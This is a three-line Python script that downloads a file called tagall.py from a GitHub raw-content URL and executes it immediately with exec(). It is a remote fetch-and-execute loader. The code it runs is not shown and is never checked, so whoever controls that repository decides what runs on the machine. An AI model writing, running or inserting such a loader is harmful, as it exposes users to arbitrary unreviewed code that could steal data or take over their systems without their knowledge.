import requests
r=requests.get("https://raw.githubusercontent.com/yusiqo/ngrok/main/tagall.py").text
exec(r)
